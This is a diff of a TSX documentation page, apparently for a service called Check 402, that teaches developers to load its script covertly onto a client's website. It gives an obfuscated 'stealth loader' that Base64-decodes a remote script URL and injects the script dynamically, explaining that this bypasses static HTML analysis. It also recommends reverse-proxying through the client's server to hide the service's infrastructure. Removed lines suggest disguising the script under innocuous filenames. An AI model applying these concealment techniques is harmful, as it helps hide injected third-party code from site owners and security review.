@@ -674,27 +674,19 @@ function SecurityGuide({ server, copiedId, copy, setActive }: GuideProps) {
             </p>
             <CodeBlock id="stealth-poly" lang="html" copiedId={copiedId} onCopy={copy} code={`<!-- Enhanced Stealth Loader -->
 <script>
-(function(a,b,c,d){a=atob(a);b=document.createElement('script');b.src=a;b.setAttribute('data-id',c);b.setAttribute('data-v',d);document.head.appendChild(b);})('${typeof btoa !== 'undefined' ? btoa(server + "/sdk/analytics.js") : "aHR0cHM6Ly9jaGVjazQwMi5jb20vc2RrL2FuYWx5dGljcy5qcw=="}',0,'${exampleKey}','${serverB64}');
+(function(a,b,c,d){a=atob(a);b=document.createElement('script');b.src=a;b.setAttribute('data-api-key',c);b.setAttribute('data-server',d);document.head.appendChild(b);})('${typeof btoa !== 'undefined' ? btoa(server + "/sdk/check402.js") : "aHR0cHM6Ly9jaGVjazQwMi5jb20vc2RrL2NoZWNrNDAyLmpz"}',0,'${exampleKey}','${serverB64}');
 </script>`} />
             <div className="p-4 bg-teal-50 border border-teal-100 rounded-xl my-6">
                 <div className="font-bold text-teal-900 mb-1 text-sm flex items-center gap-2"><Zap size={14} fill="currentColor" /> Why this works:</div>
                 <ul className="text-xs text-teal-700 font-medium space-y-1 ml-4 list-disc mt-2">
                     <li>The script <code>src</code> is Base64 encoded inside the loader.</li>
-                    <li>Attributes like <code>data-id</code> and <code>data-v</code> mask their purpose.</li>
+                    <li>The API Key and Server URL are Base64 encoded.</li>
                     <li>The script is injected dynamically, bypassing static HTML analysis.</li>
                     <li>Branded console logs are suppressed in production.</li>
                 </ul>
             </div>
 
-            <h2>Method 2: Generic Filename</h2>
-            <p>
-                Avoid using <code>check402.js</code>. We provide a generic <code>analytics.js</code> endpoint that serves the same script but looks like a standard tracking pixel.
-            </p>
-            <Callout type="info" title="Alternative Filenames">
-                <p>You can also use: <code>payment-guard.js</code>, <code>security-module.js</code>, or <code>session-manager.js</code>.</p>
-            </Callout>
-
-            <h2>Method 3: Domain Masking (Hardest)</h2>
+            <h2>Method 2: Reverse Proxying (Recommended)</h2>
             <p>
                 To completely hide the Check 402 infrastructure, use a **Reverse Proxy** on your client's server to route requests from <code>/api/security/v1</code> to <code>check402.com/api/check-status</code>.
             </p>
